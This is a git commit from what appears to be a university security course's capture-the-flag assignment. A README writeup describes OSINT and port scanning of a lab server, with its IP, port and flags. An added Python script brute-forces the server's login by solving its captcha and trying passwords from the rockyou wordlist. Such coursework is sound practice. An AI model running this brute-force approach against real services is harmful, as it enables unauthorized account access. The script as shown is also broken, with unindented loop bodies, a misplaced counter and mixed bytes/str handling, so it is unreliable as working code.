a7939ed3852d78005b14e387f7ea552c63b67ae5
Evan Vetter <vettere@terpmail.umd.edu>
2019-09-13 17:23:54 -0400

    assignment finished

--- week/2/writeup/README.md
+++ week/2/writeup/README.md
@@ -11,8 +11,21 @@ Digital acknowledgement: *PUT YOUR NAME HERE*
 
 ### Part 1 (45 pts)
 
-*Please use this space to writeup your answers and solutions (and how you found them!) for part 1.*
 
+ Found instagram.com/ejnorman84, profile linked to wattsamp.net. Real name is Eric J Norman.
+
+1.EJNORMAN works at Watts Amp Energy at wattsamp.net.
+2.Found their instagram, reddit through namechk.com. 
+3.Checked securitytrails.com and domaindossier, searched for wattsamp.net, received IP address 157.230.179.99  
+4.Found the hidden file/directory wattsamp.net/assets, /server-status through running dirb on the url.
+5. Shodan.io lists the server as being located in NY and hosted by Digital Ocean. Shodan specifically lists port 80 as being open and running off apache 2.4.29. 
+6. Running an intensive nmap scan also found port 1337. Port 1337 is the correct  port.
+7. Shodan also says that the server is running ubuntu.
+8: *CMSC389R-{html_h@x0r_lulz}*
+*CMSC389R-{Do_you-N0T_See_this}*
+*CMSC389R-{n0_indexing_pls}*
 ### Part 2 (75 pts)
 
-*Please use this space to detail your approach and solutions for part 2. Don't forget to upload your completed source code to this /writeup directory as well!*
+Wrote a parser to read the captcha, then to compute the expected result. After that, I created an iterator to run through rockyou.txt for each line in the file, printing the current password and success/fail result for each. The "count" value on the iterator was made because of connection issues causing the script to fail, so I could start back up where the connection failed.
+PW: hello1
+Flag: *CMSC389R-{!enough_nrg_4_a_str0ng_Pa$$wrd}*
---
+++ week/2/writeup/stub.py
@@ -0,0 +1,107 @@
+"""
+    If you know the IP address of v0idcache's server and you
+    know the port number of the service you are trying to connect
+    to, you can use nc or telnet in your Linux terminal to interface
+    with the server. To do so, run:
+
+        $ nc <ip address here> <port here>
+
+    In the above the example, the $-sign represents the shell, nc is the command
+    you run to establish a connection with the server using an explicit IP address
+    and port number.
+
+    If you have the discovered the IP address and port number, you should discover
+    that there is a remote control service behind a certain port. You will know you
+    have discovered the correct port if you are greeted with a login prompt when you
+    nc to the server.
+
+    In this Python script, we are mimicking the same behavior of nc'ing to the remote
+    control service, however we do so in an automated fashion. This is because it is
+    beneficial to script the process of attempting multiple login attempts, hoping that
+    one of our guesses logs us (the attacker) into the Briong server.
+
+    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
+
+"""
+
+import socket
+import re
+import string
+import time
+host = "157.230.179.99" # IP address here
+port = 1337 # Port here
+wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+
+def brute_force(x):
+    """
+        Sockets: https://docs.python.org/2/library/socket.html
+        How to use the socket s:
+
+            # Establish socket connection
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+
+            Reading:
+
+                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+                print(data)             # Prints data
+
+            Sending:
+
+                s.send("something to send\n")   # Send a newline \n at the end of your command
+
+        General idea:
+
+            Given that you know a potential username, use a wordlist and iterate
+            through each possible password and repeatedly attempt to login to
+            v0idcache's server.
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    time.sleep(1)
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+    # data = data.decode("utf-8")    
+    while "=" not in data:
+    data += s.recv(1024)
+    data = data.decode("utf-8")
+    captcha = re.search(r"(\d+) ([\*+\-\/]) (\d+) = \?$", data) 
+    
+    a = int(captcha.group(1))
+    operand = captcha.group(2)
+    b = int(captcha.group(3))
+    result = 0
+    if operand=="+":
+        result = a+b
+    elif operand=="*":
+        result = a*b
+    elif operand=="/":
+        result = a/b
+    else:
+        result = a-b
+    captch = str(result)+"\n"
+    s.send(str(result) + b'\n')
+    # s.send(captch.encode())
+    time.sleep(1)
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+    username = "ejnorman84\n"   # Hint: use OSINT
+    s.send(username)
+    time.sleep(1)
+    data = s.recv(1024)
+    print(x)
+    s.send(str(x) + '\n')
+    data = s.recv(1024)
+    while len(data) < 4:
+    data += s.recv(1024)
+    print(data)
+    s.close()
+
+if __name__ == '__main__':
+    rockyou = open(wordlist)
+    count = 567
+    whatever = rockyou.readlines()
+    for line in whatever[count:]:
+        brute_force(line.strip())
+    print(count)
+    count += 1
+        
+    rockyou.close()
